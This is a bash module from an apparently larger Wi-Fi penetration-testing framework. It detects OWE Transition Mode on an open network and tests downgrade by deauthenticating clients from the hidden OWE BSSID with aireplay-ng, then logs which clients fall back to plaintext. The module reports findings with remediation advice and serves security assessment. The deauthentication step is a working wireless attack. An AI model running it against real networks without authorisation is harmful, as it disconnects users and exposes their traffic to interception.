#!/usr/bin/env bash
# MODULE_META
# NAME="OWE Transition Downgrade"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="aireplay-ng,tcpdump,tshark"
# DESC="Test for OWE transition mode vulnerability (force fallback to open)"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="no"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d6_owe_downgrade.sh
#  D6: OWE (Opportunistic Wireless Encryption) Transition Attack
#
#  PURPOSE:
#    Test if the target "Open" network supports OWE Transition Mode, and if
#    so, attempt to force clients to downgrade to the unencrypted Open BSSID
#    by deauthenticating clients from the hidden OWE BSSID.
#
#  TOOLS: tshark, tcpdump, aireplay-ng
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1
#
#  EVIDENCE PRODUCED:
#    - d6_owe_analysis.txt           (OWE IE analysis)
#    - d6_downgrade_results.txt      (downgrade test results)
#    - d6_capture.pcap               (captured traffic during test)
#===============================================================================

set -uo pipefail

run_d6() {
    local total_steps=6
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/d6"
    local analysis_file="${evidence_prefix}_owe_analysis.txt"
    local downgrade_file="${evidence_prefix}_downgrade_results.txt"
    local cap_file="${evidence_prefix}_capture.pcap"

    #--- Step 1: Verify tools & prerequisites ---
    log_step 1 $total_steps "Verifying required tools and targets"
    update_tc_progress 1 $total_steps "Checking dependencies"

    check_module_dependencies "D6" || return 1

    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
        log_warn "Target SSID/BSSID not set."
        if ! select_target_network; then
            log_error "No target selected. Run A1 first or enter manually."
            return 1
        fi
    fi

    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID}) CH ${GUEST_CHANNEL:-auto}"

    #--- Info banner ---
    echo ""
    echo -e "${C_CYAN}╔════════════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "${C_CYAN}║  ${C_BOLD}OWE TRANSITION MODE DOWNGRADE TEST${C_RESET}${C_CYAN}                               ║${C_RESET}"
    echo -e "${C_CYAN}║                                                                    ║${C_RESET}"
    echo -e "${C_CYAN}║  Modern \"Open\" target networks often use OWE Transition Mode to     ║${C_RESET}"
    echo -e "${C_CYAN}║  provide encryption for modern clients while supporting legacy     ║${C_RESET}"
    echo -e "${C_CYAN}║  clients. This test:                                               ║${C_RESET}"
    echo -e "${C_CYAN}║    • Detects the hidden OWE BSSID linked to the Open network.      ║${C_RESET}"
    echo -e "${C_CYAN}║    • Attempts to force modern clients to downgrade to plaintext    ║${C_RESET}"
    echo -e "${C_CYAN}║      by attacking the OWE BSSID.                                   ║${C_RESET}"
    echo -e "${C_CYAN}╚════════════════════════════════════════════════════════════════════╝${C_RESET}"
    echo ""
    get_or_request_param "confirm" "  Proceed with OWE testing? [Y/n]"
    [[ "${confirm,,}" == "n" ]] && return 1

    local owe_supported="false"
    local transition_mode="false"
    local hidden_owe_bssid=""
    local clients_downgraded=0

    {
        echo "============================================================"
        echo "  D6: OWE Transition Attack"
        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
        echo "============================================================"
    } > "$analysis_file"

    #--- Step 2: Enable monitor mode ---
    log_step 2 $total_steps "Enabling monitor mode"
    update_tc_progress 2 $total_steps "Monitor mode"

    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"

    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
    fi

    check_abort || return 1

    #--- Step 3: Analyze Beacons for OWE Transition IE ---
    log_step 3 $total_steps "Analyzing beacons for OWE Transition IE (20s)"
    update_tc_progress 3 $total_steps "IE Analysis"

    local beacon_pcap="$TMP_DIR/d6_beacons.pcap"
    rm -f "$beacon_pcap"
    
    run_fg "${TOOL_PATHS[tcpdump]}" -i "$mon_iface" -c 100 -w "$beacon_pcap" \
        "type mgt subtype beacon and ether src ${GUEST_BSSID}" 2>/dev/null || true

    if [[ -f "$beacon_pcap" && -s "$beacon_pcap" ]]; then
        local owe_ie
        owe_ie=$(run_fg "${TOOL_PATHS[tshark]}" -r "$beacon_pcap" \
            -Y "wlan.tag.oui == 50:6f:9a && wlan.tag.vendor.oui.type == 28" \
            -T fields -e wlan.tag.vendor.data \
            2>/dev/null | head -1 || true)

        if [[ -n "$owe_ie" ]]; then
            transition_mode="true"
            owe_supported="true"
            hidden_owe_bssid=$(echo "$owe_ie" | sed 's/://g' | cut -c 1-12 | sed 's/\(..\)/\1:/g; s/:$//')
            
            log_result "FINDING" "OWE Transition Mode detected!"
            log_info "Hidden OWE BSSID: ${hidden_owe_bssid}"
            
            echo "OWE Transition Mode: ENABLED" >> "$analysis_file"
            echo "Linked OWE BSSID: ${hidden_owe_bssid}" >> "$analysis_file"
        else
            local akm_type
            akm_type=$(run_fg "${TOOL_PATHS[tshark]}" -r "$beacon_pcap" -T fields -e wlan.rsn.akms.type 2>/dev/null | head -1 || true)
            if echo "$akm_type" | grep -q "18"; then
                owe_supported="true"
                log_info "Network uses strict OWE (no transition mode)"
                echo "OWE Strict Mode: ENABLED (No transition IE)" >> "$analysis_file"
            else
                log_info "Target does not broadcast OWE capabilities"
                echo "OWE Support: NONE" >> "$analysis_file"
            fi
        fi
    fi
    rm -f "$beacon_pcap"

    check_abort || return 1

    #--- Step 4: Deauth OWE Clients ---
    log_step 4 $total_steps "Attempting OWE downgrade attack"
    update_tc_progress 4 $total_steps "Downgrade attack"

    if [[ "$transition_mode" == "true" && -n "$hidden_owe_bssid" ]]; then
        rm -f "$cap_file"
        spawn_bg "owe_cap" "${TOOL_PATHS[tcpdump]}" -i "$mon_iface" -w "$cap_file" \
            "wlan addr1 ${GUEST_BSSID} or wlan addr2 ${GUEST_BSSID} or wlan addr1 ${hidden_owe_bssid} or wlan addr2 ${hidden_owe_bssid}"
        
        sleep 5
        log_info "Sending deauth frames to hidden OWE BSSID: ${hidden_owe_bssid}"
        run_fg "${TOOL_PATHS[aireplay-ng]}" --deauth 15 -a "$hidden_owe_bssid" "$mon_iface"
        
        start_countdown 30 "Monitoring for fallback Association Requests"
        sleep 30
        stop_countdown
        stop_process "owe_cap"
        
        #--- Step 5: Analyze Fallback ---
        log_step 5 $total_steps "Analyzing client fallback"
        update_tc_progress 5 $total_steps "Analysis"
        
        if [[ -f "$cap_file" ]]; then
            local fallback_clients
            fallback_clients=$(run_fg "${TOOL_PATHS[tshark]}" -r "$cap_file" \
                -Y "wlan.fc.type_subtype == 0x0000 && wlan.da == ${GUEST_BSSID}" \
                -T fields -e wlan.sa 2>/dev/null | sort -u || true)
                
            if [[ -n "$fallback_clients" ]]; then
                clients_downgraded=$(echo "$fallback_clients" | wc -l)
                log_result "CRITICAL" "OWE Downgrade successful! ${clients_downgraded} client(s) fell back to Open network."
                echo "Downgraded Clients:" >> "$downgrade_file"
                echo "$fallback_clients" >> "$downgrade_file"
            else
                log_info "No clients fell back to the Open network during the test window."
            fi
        fi
    else
        log_info "Downgrade attack not applicable."
        log_step 5 $total_steps "Skipping active fallback analysis"
        update_tc_progress 5 $total_steps "Skipped"
    fi

    #--- Step 6: Save results ---
    log_step 6 $total_steps "Saving results"
    update_tc_progress 6 $total_steps "Saving"

    disable_monitor_mode

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ $clients_downgraded -gt 0 ]]; then
        result_status="FINDING"
        result_summary="CRITICAL: OWE Transition Mode downgrade successful. ${clients_downgraded} client(s) fell back to plaintext."
        recommendations="1) Phased approach: disable OWE Transition Mode and enforce strict OWE. 2) Implement MFP (802.11w) on the OWE BSSID."
    elif [[ "$transition_mode" == "true" ]]; then
        result_summary="Network uses OWE Transition Mode. No active fallbacks observed in test window."
        recommendations="Transition mode is fundamentally vulnerable to downgrade. Monitor for rogue APs stripping the OWE IE."
    elif [[ "$owe_supported" == "true" ]]; then
        result_summary="Network enforces strict OWE. Not vulnerable to transition mode downgrade."
        recommendations="Strict OWE is the recommended configuration."
    else
        result_summary="Network does not support OWE. Traffic is entirely plaintext."
        recommendations="Enable OWE (Enhanced Open) to provide unauthenticated encryption."
    fi

    evidence_register_file "$analysis_file"
    [[ -f "$downgrade_file" ]] && evidence_register_file "$downgrade_file"
    [[ -f "$cap_file" ]] && evidence_register_file "$cap_file"

    local result_json
    result_json=$(run_fg "jq" -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "OWE Supported: ${owe_supported}, Transition Mode: ${transition_mode}, Hidden BSSID: ${hidden_owe_bssid:-N/A}, Clients Downgraded: ${clients_downgraded}" \
        --arg recommendations "$recommendations" \
        --arg owe_supported "$owe_supported" \
        --arg transition_mode "$transition_mode" \
        --arg hidden_owe_bssid "$hidden_owe_bssid" \
        --argjson clients_downgraded "$clients_downgraded" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            owe_supported: ($owe_supported == "true"),
            transition_mode: ($transition_mode == "true"),
            hidden_owe_bssid: $hidden_owe_bssid,
            clients_downgraded: $clients_downgraded
        }')

    local has_pri=0
    [[ -f "$cap_file" && -s "$cap_file" ]] && has_pri=1
    local is_secure=0
    [[ "$result_status" == "SECURE" ]] && is_secure=1

    save_tc_result "D6" "$result_json" 1 1 $has_pri 1 1 1 0 1 1 1 $is_secure
    save_session_state

    return 0
}
